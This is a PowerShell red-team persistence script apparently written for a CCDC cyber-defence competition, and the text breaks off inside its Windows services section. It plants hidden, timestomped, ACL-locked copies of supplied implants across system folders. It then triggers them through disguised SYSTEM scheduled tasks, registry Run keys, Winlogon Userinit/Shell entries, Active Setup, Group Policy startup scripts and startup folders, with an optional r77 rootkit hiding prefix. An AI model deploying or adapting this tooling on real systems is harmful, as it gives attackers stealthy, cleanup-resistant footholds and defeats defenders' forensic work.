# CCDC Windows Phase 3 - Persistence: MEGA NUKER OF DEATH
# MITRE ATT&CK: T1053.005 T1547.001 T1547.004 T1547.005 T1547.009
#               T1547.010 T1543.003 T1546.003 T1197 T1036.003 T1070.006
#
# Sections:
#   A - Payload staging        12 locations each, timestomped, ACL-locked
#   B - Scheduled tasks        16 tasks (8 beacon + 8 session), PT5M, XML
#   C - Registry run keys      HKLM/HKCU/WOW64, Winlogon, ActiveSetup, GPState
#   D - Startup folders        All-users + current-user, LNK+BAT+CMD+EXE
#   E - Windows services       4 services (2 beacon + 2 session), auto-start
#   F - WMI subscriptions      3 subscriptions
#   G - BITS persistence       Self-requeuing notify loop
#   H - Misc                   SilentProcessExit, screensaver, print monitor, LSA
#
# Each persistence mechanism points to a DIFFERENT planted copy of the binary.
# Deleting one file does not kill all triggers.
#
# Run as: Administrator or SYSTEM
#Requires -RunAsAdministrator
#Requires -Version 5.1

Set-StrictMode -Version Latest
$ErrorActionPreference = "Continue"

function Write-Info    { param($m) Write-Host "[*] $m" -ForegroundColor Cyan    }
function Write-Success { param($m) Write-Host "[+] $m" -ForegroundColor Green   }
function Write-Warn    { param($m) Write-Host "[!] $m" -ForegroundColor Yellow  }
function Write-Err     { param($m) Write-Host "[-] $m" -ForegroundColor Red     }
function Write-Section { param($m) Write-Host "`n====[ $m ]====" -ForegroundColor Magenta }

Write-Host ""
Write-Warn "================================================================"
Write-Warn " CCDC Phase 3 -- Persistence: MEGA NUKER OF DEATH"
Write-Warn " A(Stage) B(Tasks) C(Reg) D(Startup) E(Svc) F(WMI) G(BITS) H(Misc)"
Write-Warn "================================================================"
Write-Host ""

# --- Prompt for implant paths ---
$BeaconPath  = Read-Host "Enter full path to beacon implant (e.g. C:\Users\Administrator\beac07)"
$SessionPath = Read-Host "Enter full path to session implant (e.g. C:\Users\Administrator\ses08)"

# --- r77 prefix prompt ---
$r77Answer = Read-Host "Prepend `$77 prefix to dropped files/folders/reg-values for r77 hiding? (y/N)"
$pfx = ''
if ($r77Answer -match '^[Yy]') { $pfx = '$77' }
if ($pfx) {
    Write-Warn "r77 mode ENABLED -- all dropped artifacts prefixed: $pfx"
} else {
    Write-Info "r77 mode: disabled"
}

$StagingBase = "$env:SystemRoot\System32\spool\drivers\color"

# --- Input validation ---
Write-Section "Input Validation"
foreach ($p in @($BeaconPath, $SessionPath)) {
    if (-not (Test-Path $p -PathType Leaf)) {
        Write-Err "File not found: $p"
        exit 1
    }
}
$BeaconPath  = (Resolve-Path $BeaconPath).Path
$SessionPath = (Resolve-Path $SessionPath).Path
Write-Info "Beacon  : $BeaconPath"
Write-Info "Session : $SessionPath"
Write-Info "Staging : $StagingBase"

# --- Reference timestamp (match ntdll.dll) ---
$script:RefTime = $null
foreach ($c in @("$env:SystemRoot\System32\ntdll.dll","$env:SystemRoot\System32\kernel32.dll")) {
    if (Test-Path $c) { $script:RefTime = (Get-Item $c -Force).LastWriteTime; break }
}
if ($null -eq $script:RefTime) { $script:RefTime = [datetime]"2019-03-19 03:44:22" }
Write-Info "Reference timestamp: $($script:RefTime)"

# --- State log ---
$script:StateFile = "$StagingBase\.mnod_state.csv"
$script:Log = New-Object System.Collections.Generic.List[object]

function Add-Log {
    param([string]$Section, [string]$Type, [string]$Path, [string]$Status, [string]$Notes = '')
    $script:Log.Add([PSCustomObject]@{
        Timestamp = (Get-Date -Format 'yyyy-MM-dd HH:mm:ss')
        Section   = $Section; Type = $Type; Path = $Path; Status = $Status; Notes = $Notes
    })
}

function Write-StateLog {
    try {
        if (-not (Test-Path $StagingBase)) { New-Item -ItemType Directory -Path $StagingBase -Force | Out-Null }
        $script:Log | Export-Csv $script:StateFile -NoTypeInformation -Force -ErrorAction Stop
        $f = Get-Item $script:StateFile -ErrorAction SilentlyContinue
        if ($f) { $f.Attributes = 'Hidden,System' }
    } catch { Write-Warn "State log write failed: $_" }
}

# --- Shared helpers ---
function Invoke-Timestomp {
    param([string]$Path)
    if (-not (Test-Path $Path -PathType Leaf)) { return }
    try {
        [System.IO.File]::SetCreationTime($Path,   $script:RefTime)
        [System.IO.File]::SetLastWriteTime($Path,  $script:RefTime)
        [System.IO.File]::SetLastAccessTime($Path, $script:RefTime)
    } catch { }
}

function Set-StealthAttributes {
    param([string]$Path)
    try {
        $item = Get-Item -LiteralPath $Path -Force -ErrorAction Stop
        $item.Attributes = $item.Attributes -bor [System.IO.FileAttributes]::Hidden -bor [System.IO.FileAttributes]::System
    } catch { }
}

function Set-AclLock {
    param([string]$Path)
    try {
        & icacls.exe $Path /inheritance:r /grant:r "NT AUTHORITY\SYSTEM:(F)" 2>&1 | Out-Null
        & icacls.exe $Path /deny "BUILTIN\Users:(RX,W,D)" 2>&1 | Out-Null
    } catch { }
}

function Copy-Stealth {
    param([string]$Source, [string]$Destination)
    try {
        $dir = Split-Path $Destination -Parent
        if (-not (Test-Path $dir)) { New-Item -ItemType Directory -Path $dir -Force -ErrorAction Stop | Out-Null }
        Copy-Item -Path $Source -Destination $Destination -Force -ErrorAction Stop
        Set-StealthAttributes -Path $Destination
        Invoke-Timestomp      -Path $Destination
        Set-AclLock           -Path $Destination
        return $Destination
    } catch {
        return $null
    }
}

function New-TaskSubfolder {
    param([string]$FolderPath)
    try {
        $svc = New-Object -ComObject Schedule.Service -ErrorAction Stop
        $svc.Connect()
        $parts = $FolderPath.Trim('\').Split('\')
        $cur   = $svc.GetFolder("\")
        foreach ($p in $parts) {
            try   { $cur = $cur.GetFolder($p) }
            catch { $cur = $cur.CreateFolder($p) }
        }
    } catch { }
}

function Get-TaskXml {
    param(
        [string]$Command,
        [string]$Arguments   = '',
        [int]$OffsetSeconds  = 30,
        [bool]$AddLogon      = $false,
        [string]$Description = 'Windows diagnostic and telemetry service host'
    )
    $startBoundary = (Get-Date).AddSeconds($OffsetSeconds).ToString("yyyy-MM-ddTHH:mm:ss")
    $xmlCmd  = [System.Security.SecurityElement]::Escape($Command)
    $xmlArgs = [System.Security.SecurityElement]::Escape($Arguments)
    $xmlDesc = [System.Security.SecurityElement]::Escape($Description)

    $logonBlock = ''
    if ($AddLogon) {
        $logonBlock = "    <LogonTrigger><Enabled>true</Enabled><Delay>PT30S</Delay></LogonTrigger>"
    }
    $argsBlock = ''
    if ($Arguments -ne '') { $argsBlock = "      <Arguments>$xmlArgs</Arguments>" }

    return @"
<?xml version="1.0" encoding="UTF-16"?>
<Task version="1.4" xmlns="http://schemas.microsoft.com/windows/2004/02/mit/task">
  <RegistrationInfo><Description>$xmlDesc</Description></RegistrationInfo>
  <Triggers>
    <TimeTrigger>
      <Repetition>
        <Interval>PT5M</Interval>
        <Duration>P9999D</Duration>
        <StopAtDurationEnd>false</StopAtDurationEnd>
      </Repetition>
      <StartBoundary>$startBoundary</StartBoundary>
      <Enabled>true</Enabled>
    </TimeTrigger>
    <BootTrigger><Enabled>true</Enabled><Delay>PT1M</Delay></BootTrigger>
    $logonBlock
  </Triggers>
  <Principals>
    <Principal id="Author">
      <UserId>S-1-5-18</UserId>
      <RunLevel>HighestAvailable</RunLevel>
    </Principal>
  </Principals>
  <Settings>
    <MultipleInstancesPolicy>IgnoreNew</MultipleInstancesPolicy>
    <DisallowStartIfOnBatteries>false</DisallowStartIfOnBatteries>
    <StopIfGoingOnBatteries>false</StopIfGoingOnBatteries>
    <AllowHardTerminate>false</AllowHardTerminate>
    <StartWhenAvailable>true</StartWhenAvailable>
    <RunOnlyIfNetworkAvailable>false</RunOnlyIfNetworkAvailable>
    <IdleSettings><StopOnIdleEnd>false</StopOnIdleEnd><RestartOnIdle>false</RestartOnIdle></IdleSettings>
    <Enabled>true</Enabled>
    <Hidden>true</Hidden>
    <RunOnlyIfIdle>false</RunOnlyIfIdle>
    <WakeToRun>false</WakeToRun>
    <ExecutionTimeLimit>PT0S</ExecutionTimeLimit>
    <Priority>7</Priority>
    <RestartOnFailure><Interval>PT1M</Interval><Count>10</Count></RestartOnFailure>
  </Settings>
  <Actions Context="Author">
    <Exec>
      <Command>$xmlCmd</Command>
      $argsBlock
    </Exec>
  </Actions>
</Task>
"@
}

# =============================================================================
# SECTION A - PAYLOAD STAGING
# =============================================================================
Write-Section "A - Payload Staging (12 locations each)"

# -- Guaranteed pre-stage: ensures Primary always has a .exe path --
Write-Info "Pre-staging guaranteed .exe copies to staging base..."
if (-not (Test-Path $StagingBase)) { New-Item -ItemType Directory -Path $StagingBase -Force -ErrorAction SilentlyContinue | Out-Null }
$preBeaconPath  = Join-Path $StagingBase "${pfx}beacon_primary.exe"
$preSessionPath = Join-Path $StagingBase "${pfx}session_primary.exe"
try { Copy-Item $BeaconPath  $preBeaconPath  -Force -ErrorAction Stop; Set-StealthAttributes $preBeaconPath;  Invoke-Timestomp $preBeaconPath  } catch { $preBeaconPath  = $null }
try { Copy-Item $SessionPath $preSessionPath -Force -ErrorAction Stop; Set-StealthAttributes $preSessionPath; Invoke-Timestomp $preSessionPath } catch { $preSessionPath = $null }
$script:PrimaryBeacon  = if ($preBeaconPath)  { $preBeaconPath  } else { $BeaconPath  }
$script:PrimarySession = if ($preSessionPath) { $preSessionPath } else { $SessionPath }
Write-Success "  Guaranteed beacon  .exe: $($script:PrimaryBeacon)"
Write-Success "  Guaranteed session .exe: $($script:PrimarySession)"

$stageNamePool = @(
    "svchost_diag",   "taskhostw_mon",   "wermgr_svc",
    "diagtracksvc",   "lsaiso_ext",      "cryptsvc_mon",
    "dllhost_svc",    "rpcss_ext",       "spoolsv_mon",
    "wbemcore_ext",   "vds_ext",         "wmisvc_ext"
)

$stageDirs = @(
    "$env:SystemRoot\System32",
    "$env:SystemRoot\SysWOW64",
    "$env:SystemRoot\System32\spool",
    "$env:SystemRoot\System32\wbem",
    "$env:SystemRoot\System32\drivers",
    "$env:SystemRoot\System32\Tasks\Microsoft\Windows\WindowsUpdate",
    "$env:SystemRoot\System32\Tasks\Microsoft\Windows\Diagnosis",
    "$env:ProgramData\Microsoft\Windows\WER\ReportArchive",
    "$env:SystemRoot\Temp",
    "$env:SystemRoot\inf",
    "$env:SystemRoot\Logs\CBS",
    "$env:ProgramData\Microsoft\Windows\DeviceMetadataCache"
)

$script:StagedBeacons  = New-Object System.Collections.Generic.List[string]
$script:StagedSessions = New-Object System.Collections.Generic.List[string]

for ($i = 0; $i -lt $stageDirs.Count; $i++) {
    $dir     = $stageDirs[$i]
    $bName   = "${pfx}$($stageNamePool[$i]).exe"
    $sName   = "${pfx}$($stageNamePool[$i])_s.exe"
    $bDest   = Join-Path $dir $bName
    $sDest   = Join-Path $dir $sName

    $bResult = Copy-Stealth -Source $BeaconPath  -Destination $bDest
    $sResult = Copy-Stealth -Source $SessionPath -Destination $sDest

    if ($bResult) {
        $script:StagedBeacons.Add($bResult)
        Add-Log "A" "Beacon"  $bResult "OK"
        Write-Success "  Beacon  staged: $bResult"
    } else { Add-Log "A" "Beacon" $bDest "FAIL" }

    if ($sResult) {
        $script:StagedSessions.Add($sResult)
        Add-Log "A" "Session" $sResult "OK"
        Write-Success "  Session staged: $sResult"
    } else { Add-Log "A" "Session" $sDest "FAIL" }
}

# Override primary with a hidden system-dir copy if any staging succeeded
if ($script:StagedBeacons.Count  -gt 0) { $script:PrimaryBeacon  = $script:StagedBeacons[0]  }
if ($script:StagedSessions.Count -gt 0) { $script:PrimarySession = $script:StagedSessions[0] }
Write-Info "Primary beacon  : $($script:PrimaryBeacon)"
Write-Info "Primary session : $($script:PrimarySession)"
Write-StateLog

# =============================================================================
# ROUND-ROBIN DISTRIBUTORS
# Each call returns the next planted copy in sequence so every persistence
# mechanism points to a different file. Deleting one file kills only one trigger.
# =============================================================================
$script:BeaconIdx  = 0
$script:SessionIdx = 0

function Get-NextBeacon {
    if ($script:StagedBeacons.Count -gt 0) {
        $r = $script:StagedBeacons[$script:BeaconIdx % $script:StagedBeacons.Count]
    } else {
        $r = $script:PrimaryBeacon
    }
    $script:BeaconIdx++
    return $r
}

function Get-NextSession {
    if ($script:StagedSessions.Count -gt 0) {
        $r = $script:StagedSessions[$script:SessionIdx % $script:StagedSessions.Count]
    } else {
        $r = $script:PrimarySession
    }
    $script:SessionIdx++
    return $r
}

# =============================================================================
# SECTION B - SCHEDULED TASKS (16 total, XML, PT5M, staggered)
# Each task gets a different planted copy
# =============================================================================
Write-Section "B - Scheduled Tasks (16 x PT5M, Hidden, SYSTEM)"

$taskDefs = @(
    @{ Folder = "Microsoft\Windows\WindowsUpdate";             Name = "USOSessionWorker2";   Payload = (Get-NextBeacon)  },
    @{ Folder = "Microsoft\Windows\Diagnosis";                 Name = "DiagTrackScheduler";  Payload = (Get-NextBeacon)  },
    @{ Folder = "Microsoft\Windows\Defrag";                    Name = "StorOptimizer";        Payload = (Get-NextBeacon)  },
    @{ Folder = "Microsoft\Windows\DiskCleanup";               Name = "SilentCleanup2";       Payload = (Get-NextBeacon)  },
    @{ Folder = "Microsoft\Windows\NetTrace";                  Name = "NetworkDiagLogger";    Payload = (Get-NextBeacon)  },
    @{ Folder = "Microsoft\Windows\Registry";                  Name = "RegIdleBackup2";       Payload = (Get-NextBeacon)  },
    @{ Folder = "Microsoft\Windows\PerfTrack";                 Name = "PerfCounterSync";      Payload = (Get-NextBeacon)  },
    @{ Folder = "Microsoft\Windows\CertificateServicesClient"; Name = "AutoUpdate2";          Payload = (Get-NextBeacon)  },
    @{ Folder = "Microsoft\Windows\USOPrivate";                Name = "UsoSessionWorker3";    Payload = (Get-NextSession) },
    @{ Folder = "Microsoft\Windows\InstallService";            Name = "WinDataCollector";     Payload = (Get-NextSession) },
    @{ Folder = "Microsoft\Windows\MemoryDiagnostic";          Name = "ProcessMemoryDiag";    Payload = (Get-NextSession) },
    @{ Folder = "Microsoft\Windows\WDI";                       Name = "ResolutionHost2";      Payload = (Get-NextSession) },
    @{ Folder = "Microsoft\Windows\ApplicationData";           Name = "CleanupTempState2";    Payload = (Get-NextSession) },
    @{ Folder = "Microsoft\Windows\Shell";                     Name = "CreateObjectTask2";    Payload = (Get-NextSession) },
    @{ Folder = "Microsoft\Windows\ErrorDetails";              Name = "EnableErrorDetails2";  Payload = (Get-NextSession) },
    @{ Folder = "Microsoft\Windows\BrokerInfrastructure";      Name = "BrokerMaintenance2";   Payload = (Get-NextSession) }
)

$bTaskOk = 0; $sTaskOk = 0
for ($i = 0; $i -lt $taskDefs.Count; $i++) {
    $td       = $taskDefs[$i]
    $offset   = 30 + ($i * 30)
    $addLogon = ($i % 2 -eq 0)
    $folder   = $td.Folder
    $name     = $td.Name
    $taskPath = "\$folder\"
    $cmd      = $td.Payload

    Write-Info "Task [$($i+1)/16] $taskPath$name -> $cmd"
    try {
        New-TaskSubfolder -FolderPath $folder
        $xml = Get-TaskXml -Command $cmd -OffsetSeconds $offset -AddLogon $addLogon -Description "Windows $name management host"
        Unregister-ScheduledTask -TaskName $name -TaskPath $taskPath -Confirm:$false -ErrorAction SilentlyContinue
        Register-ScheduledTask   -TaskName $name -TaskPath $taskPath -Xml $xml -Force -ErrorAction Stop | Out-Null
        Write-Success "  OK: $taskPath$name"
        Add-Log "B" "Task" "$taskPath$name" "OK" "cmd=$cmd"
        if ($i -lt 8) { $bTaskOk++ } else { $sTaskOk++ }
    } catch {
        Write-Err "  FAIL [$name]: $_"
        Add-Log "B" "Task" "$taskPath$name" "FAIL" "$_"
    }
}
Write-Success "B: $bTaskOk/8 beacon tasks + $sTaskOk/8 session tasks registered"
Write-StateLog

# =============================================================================
# SECTION C - REGISTRY BOOT PERSISTENCE
# =============================================================================
Write-Section "C - Registry Boot Persistence"

# C1: HKLM Run (3 beacon + 3 session, each a different planted copy)
Write-Section "C1 - HKLM Run"
$hklmRunKey = "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Run"
@(
    @{ Name = "${pfx}WerFaultSvcHost"; Path = (Get-NextBeacon)  },
    @{ Name = "${pfx}CryptSvcMonitor"; Path = (Get-NextBeacon)  },
    @{ Name = "${pfx}DiagTrackHelper"; Path = (Get-NextBeacon)  },
    @{ Name = "${pfx}WmiPerfSvcHost";  Path = (Get-NextSession) },
    @{ Name = "${pfx}DcomSvcMonitor";  Path = (Get-NextSession) },
    @{ Name = "${pfx}NtServiceHelper"; Path = (Get-NextSession) }
) | ForEach-Object {
    try {
        Set-ItemProperty -Path $hklmRunKey -Name $_.Name -Value ('"' + $_.Path + '"') -Type String -Force
        Write-Success "  HKLM Run: $($_.Name) -> $($_.Path)"
        Add-Log "C1" "RunKey" "$hklmRunKey\$($_.Name)" "OK"
    } catch { Write-Warn "  C1 failed [$($_.Name)]: $_" }
}

# C2: HKCU Run (2 beacon + 2 session) + all offline user hives
Write-Section "C2 - HKCU Run + offline hives"
$c2b1 = Get-NextBeacon; $c2b2 = Get-NextBeacon
$c2s1 = Get-NextSession; $c2s2 = Get-NextSession
$hkcuRunKey = "HKCU:\SOFTWARE\Microsoft\Windows\CurrentVersion\Run"
@(
    @{ Name = "${pfx}WinDiagSvc";   Path = $c2b1 },
    @{ Name = "${pfx}WinSvcHelper"; Path = $c2b2 },
    @{ Name = "${pfx}WinMonSvc";    Path = $c2s1 },
    @{ Name = "${pfx}WinCacheSvc";  Path = $c2s2 }
) | ForEach-Object {
    try {
        Set-ItemProperty -Path $hkcuRunKey -Name $_.Name -Value ('"' + $_.Path + '"') -Type String -Force
        Write-Success "  HKCU Run (current): $($_.Name) -> $($_.Path)"
        Add-Log "C2" "RunKey" "$hkcuRunKey\$($_.Name)" "OK"
    } catch { Write-Warn "  C2 HKCU failed: $_" }
}

$offlineOk = 0
Get-ChildItem "C:\Users" -Directory -ErrorAction SilentlyContinue |
    Where-Object { $_.Name -notin @("Public","Default","Default User","All Users") } |
    ForEach-Object {
        $ntuserDat = Join-Path $_.FullName "NTUSER.DAT"
        if (Test-Path $ntuserDat) {
            $tmpKey = "HKU\CC_RUN_$($_.Name)"
            & reg.exe load $tmpKey $ntuserDat 2>&1 | Out-Null
            try {
                $hiveRun = "Registry::${tmpKey}\SOFTWARE\Microsoft\Windows\CurrentVersion\Run"
                if (-not (Test-Path $hiveRun)) { New-Item -Path $hiveRun -Force | Out-Null }
                Set-ItemProperty $hiveRun -Name "${pfx}WinDiagSvc" -Value ('"' + $c2b1 + '"') -Force
                Set-ItemProperty $hiveRun -Name "${pfx}WinMonSvc"  -Value ('"' + $c2s1 + '"') -Force
                $offlineOk++
            } finally { & reg.exe unload $tmpKey 2>&1 | Out-Null }
        }
    }
Write-Success "C2: Applied to $offlineOk offline user hives"

# C3: WOW6432Node Run (2 beacon + 2 session)
Write-Section "C3 - WOW6432Node Run"
$wowRunKey = "HKLM:\SOFTWARE\WOW6432Node\Microsoft\Windows\CurrentVersion\Run"
@(
    @{ Name = "${pfx}WowDiagHelper"; Path = (Get-NextBeacon)  },
    @{ Name = "${pfx}WowWerSvc";     Path = (Get-NextBeacon)  },
    @{ Name = "${pfx}WowMonSvc";     Path = (Get-NextSession) },
    @{ Name = "${pfx}WowPerfSvc";    Path = (Get-NextSession) }
) | ForEach-Object {
    try {
        Set-ItemProperty -Path $wowRunKey -Name $_.Name -Value ('"' + $_.Path + '"') -Type String -Force
        Write-Success "  WOW64 Run: $($_.Name) -> $($_.Path)"
        Add-Log "C3" "RunKey" "$wowRunKey\$($_.Name)" "OK"
    } catch { Write-Warn "  C3 failed [$($_.Name)]: $_" }
}

# C4: Winlogon Userinit append
Write-Section "C4 - Winlogon Userinit"
$c4Beacon = Get-NextBeacon
try {
    $wlKey = "HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon"
    $cur   = (Get-ItemProperty $wlKey -Name "Userinit" -ErrorAction Stop).Userinit
    if ($cur -notlike "*$c4Beacon*") {
        Set-ItemProperty $wlKey -Name "Userinit" -Value ($cur.TrimEnd(',') + ",$c4Beacon") -Force
        Write-Success "C4 Userinit: appended $c4Beacon"
        Add-Log "C4" "Winlogon" "Userinit" "OK"
    } else { Write-Info "C4 Userinit: already present" }
} catch { Write-Warn "C4 Userinit failed: $_" }

# C5: Winlogon Shell append
Write-Section "C5 - Winlogon Shell"
$c5Session = Get-NextSession
try {
    $wlKey    = "HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon"
    $curShell = (Get-ItemProperty $wlKey -Name "Shell" -ErrorAction Stop).Shell
    if (-not $curShell) { $curShell = "explorer.exe" }
    if ($curShell -notlike "*$c5Session*") {
        Set-ItemProperty $wlKey -Name "Shell" -Value ($curShell.TrimEnd(',') + ",$c5Session") -Force
        Write-Success "C5 Shell: appended $c5Session"
        Add-Log "C5" "Winlogon" "Shell" "OK"
    } else { Write-Info "C5 Shell: already present" }
} catch { Write-Warn "C5 Shell failed: $_" }

# C6: Active Setup StubPath (3 beacon + 2 session, each a different copy)
Write-Section "C6 - Active Setup StubPath"
$activeSetupBase = "HKLM:\SOFTWARE\Microsoft\Active Setup\Installed Components"
@(
    @{ GUID = "{8A69D345-D564-463C-AFF1-A69D9E530F96}"; Path = (Get-NextBeacon);  Label = "Google Update Core"     },
    @{ GUID = "{89820200-ECBD-11CF-8B85-00AA005B4383}"; Path = (Get-NextBeacon);  Label = "Microsoft Active Setup" },
    @{ GUID = "{76E4F460-2C62-4E3A-A5E6-00AA005B0083}"; Path = (Get-NextBeacon);  Label = "Microsoft Edge Compat"  },
    @{ GUID = "{44BBA840-CC51-11CF-AAFA-00AA00B6015C}"; Path = (Get-NextSession); Label = "Outlook Express"        },
    @{ GUID = "{2179C5D3-EBFF-11CF-B6FD-00AA00B4E220}"; Path = (Get-NextSession); Label = "NetMeeting"             }
) | ForEach-Object {
    try {
        $asKey = "$activeSetupBase\$($_.GUID)"
        if (-not (Test-Path $asKey)) { New-Item -Path $asKey -Force | Out-Null }
        Set-ItemProperty $asKey -Name "(Default)"   -Value $_.Label                    -Force
        Set-ItemProperty $asKey -Name "StubPath"    -Value ('"' + $_.Path + '"')       -Force
        Set-ItemProperty $asKey -Name "Version"     -Value "1,0,0,1"                   -Force
        Set-ItemProperty $asKey -Name "IsInstalled" -Value 1 -Type DWord               -Force
        Write-Success "  Active Setup: $($_.GUID) -> $($_.Path)"
        Add-Log "C6" "ActiveSetup" $asKey "OK"
    } catch { Write-Warn "  C6 Active Setup [$($_.GUID)] failed: $_" }
}

# C7: Group Policy State machine startup script
Write-Section "C7 - GP State Startup Script"
$c7Beacon = Get-NextBeacon
try {
    $gpBase   = "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Group Policy\State\Machine\Scripts\Startup\0"
    $gpScript = "$gpBase\0"
    if (-not (Test-Path $gpBase))   { New-Item -Path $gpBase   -Force | Out-Null }
    if (-not (Test-Path $gpScript)) { New-Item -Path $gpScript -Force | Out-Null }
    Set-ItemProperty $gpBase   -Name "GPO-ID"       -Value "LocalGPO" -Force
    Set-ItemProperty $gpBase   -Name "SOM-ID"       -Value "Local"    -Force
    Set-ItemProperty $gpBase   -Name "Count"        -Value 1 -Type DWord -Force
    Set-ItemProperty $gpBase   -Name "ExecTime"     -Value ([byte[]](0,0,0,0,0,0,0,0)) -Type Binary -Force
    Set-ItemProperty $gpScript -Name "Script"       -Value $c7Beacon -Force
    Set-ItemProperty $gpScript -Name "Parameters"   -Value "" -Force
    Set-ItemProperty $gpScript -Name "IsPowershell" -Value 0 -Type DWord -Force
    Set-ItemProperty $gpScript -Name "ExecTime"     -Value ([byte[]](0,0,0,0,0,0,0,0)) -Type Binary -Force
    Write-Success "C7 GP startup script: $c7Beacon"
    Add-Log "C7" "GPStartup" $gpScript "OK"
} catch { Write-Warn "C7 GP startup script failed: $_" }

Write-StateLog

# =============================================================================
# SECTION D - STARTUP FOLDERS (each file type gets a different planted copy)
# =============================================================================
Write-Section "D - Startup Folders (LNK + BAT + CMD + EXE)"

$startupFolders = @(
    "C:\ProgramData\Microsoft\Windows\Start Menu\Programs\Startup",
    "$env:APPDATA\Microsoft\Windows\Start Menu\Programs\Startup"
)

$wsh = $null
try { $wsh = New-Object -ComObject WScript.Shell -ErrorAction Stop } catch { Write-Warn "D: WScript.Shell unavailable -- skipping .lnk creation" }

foreach ($sFolder in $startupFolders) {
    if (-not (Test-Path $sFolder)) {
        try { New-Item -ItemType Directory -Path $sFolder -Force | Out-Null } catch { continue }
    }
    Write-Info "Startup folder: $sFolder"

    # Each file type gets a fresh copy from the distributor
    $dLnkB = Get-NextBeacon;  $dLnkS = Get-NextSession
    $dBatB = Get-NextBeacon;  $dBatS = Get-NextSession
    $dCmdB = Get-NextBeacon;  $dCmdS = Get-NextSession
    $dExeB = Get-NextBeacon;  $dExeS = Get-NextSession

    if ($wsh) {
        try {
            $lnkB = Join-Path $sFolder "${pfx}WinDiagHelper.lnk"
            $lnk  = $wsh.CreateShortcut($lnkB)
            $lnk.TargetPath = $dLnkB; $lnk.WorkingDirectory = $env:SystemRoot
            $lnk.Description = "Windows Diagnostic Helper"
            $lnk.IconLocation = "$env:SystemRoot\System32\shell32.dll,21"
            $lnk.Save()
            Set-StealthAttributes $lnkB; Invoke-Timestomp $lnkB
            Add-Log "D" "LNK" $lnkB "OK"; Write-Success "  LNK beacon: $lnkB -> $dLnkB"
        } catch { Write-Warn "  D LNK beacon failed: $_" }

        try {
            $lnkS = Join-Path $sFolder "${pfx}WinSvcHelper.lnk"
            $lnk  = $wsh.CreateShortcut($lnkS)
            $lnk.TargetPath = $dLnkS; $lnk.WorkingDirectory = $env:SystemRoot
            $lnk.Description = "Windows Service Helper"
            $lnk.IconLocation = "$env:SystemRoot\System32\shell32.dll,21"
            $lnk.Save()
            Set-StealthAttributes $lnkS; Invoke-Timestomp $lnkS
            Add-Log "D" "LNK" $lnkS "OK"; Write-Success "  LNK session: $lnkS -> $dLnkS"
        } catch { Write-Warn "  D LNK session failed: $_" }
    }

    try {
        $batB = Join-Path $sFolder "${pfx}windiag_helper.bat"
        [System.IO.File]::WriteAllText($batB, "@echo off`r`nstart /B `"`" `"$dBatB`"`r`n", [System.Text.Encoding]::ASCII)
        Set-StealthAttributes $batB; Invoke-Timestomp $batB
        Add-Log "D" "BAT" $batB "OK"; Write-Success "  BAT beacon: $batB -> $dBatB"
    } catch { Write-Warn "  D BAT beacon failed: $_" }

    try {
        $batS = Join-Path $sFolder "${pfx}winsvc_helper.bat"
        [System.IO.File]::WriteAllText($batS, "@echo off`r`nstart /B `"`" `"$dBatS`"`r`n", [System.Text.Encoding]::ASCII)
        Set-StealthAttributes $batS; Invoke-Timestomp $batS
        Add-Log "D" "BAT" $batS "OK"; Write-Success "  BAT session: $batS -> $dBatS"
    } catch { Write-Warn "  D BAT session failed: $_" }

    try {
        $cmdB = Join-Path $sFolder "${pfx}windiag_svc.cmd"
        [System.IO.File]::WriteAllText($cmdB, "@echo off`r`nstart /B `"`" `"$dCmdB`"`r`n", [System.Text.Encoding]::ASCII)
        Set-StealthAttributes $cmdB; Invoke-Timestomp $cmdB
        Add-Log "D" "CMD" $cmdB "OK"
    } catch { Write-Warn "  D CMD beacon failed: $_" }

    try {
        $cmdS = Join-Path $sFolder "${pfx}winsvc_mon.cmd"
        [System.IO.File]::WriteAllText($cmdS, "@echo off`r`nstart /B `"`" `"$dCmdS`"`r`n", [System.Text.Encoding]::ASCII)
        Set-StealthAttributes $cmdS; Invoke-Timestomp $cmdS
        Add-Log "D" "CMD" $cmdS "OK"
    } catch { Write-Warn "  D CMD session failed: $_" }

    $exeB = Join-Path $sFolder "${pfx}windiag_host.exe"
    $r = Copy-Stealth -Source $dExeB -Destination $exeB
    if ($r) { Add-Log "D" "EXE" $exeB "OK"; Write-Success "  EXE beacon: $exeB (src: $dExeB)" }

    $exeS = Join-Path $sFolder "${pfx}winsvc_host.exe"
    $r = Copy-Stealth -Source $dExeS -Destination $exeS
    if ($r) { Add-Log "D" "EXE" $exeS "OK"; Write-Success "  EXE session: $exeS (src: $dExeS)" }
}
Write-StateLog

# =============================================================================
# SECTION E - WINDOWS SERVICES (each service gets a different planted copy)
# =============================================================================
Write-Section "E - Windows Services (4 auto-start, SYSTEM)"

$psExe = "$env:SystemRoot\System32\WindowsPowerShell\v1.0\powershell.exe"

function New-WrapperPs1 {
    param([string]$PayloadPath, [string]$WrapperPath)
    $content = "while (`$true) {`r`n    try {`r`n        `$p = Start-Process -FilePath '$PayloadPath' -WindowStyle Hidden -PassThru -ErrorAction SilentlyContinue`r`n        if (`$p) { `$p.WaitForExit() }`r`n    } catch {}`r`n    Start-Sleep -Seconds 5`r`n}`r`n"
    try {
        [System.IO.File]::WriteAllText($WrapperPath, $content, [System.Text.Encoding]::ASCII)
        Set-StealthAttributes $WrapperPath
        Invoke-Timestomp      $WrapperPath
        return $WrapperPath
    } catch { return $null }
}

$svcDefs = @(
    @{ Name = "WerFaultSvcExt";  Display = "Windows Error Reporting Fault Extension";    Desc = "Provides host process support for Windows Error Reporting.";     Payload = (Get-NextBeacon)  },
    @{ Name = "CryptSvcMonitor"; Display = "Cryptographic Service Monitor";              Desc = "Monitors and maintains cryptographic service health.";            Payload = (Get-NextBeacon)  },
    @{ Name = "WmiPerfSvcHost";  Display = "WMI Performance Adapter Host Service";       Desc = "Provides WMI performance counter host adapter functionality.";    Payload = (Get-NextSession) },
    @{ Name = "DiagTrackSvcExt"; Display = "Connected User Experiences Diagnostics Ext"; Desc = "Extends diagnostics and telemetry for connected user experiences."; Payload = (Get-NextSession) }
)

foreach ($svcDef in $svcDefs) {
    $svcPayload = $svcDef.Payload
    Write-Info "Service: $($svcDef.Name) -> $svcPayload"
    try {
        $wrapPath   = Join-Path $StagingBase "${pfx}$($svcDef.Name)_wrap.ps1"
        $wrapResult = New-WrapperPs1 -PayloadPath $svcPayload -WrapperPath $wrapPath

        if ($wrapResult) {
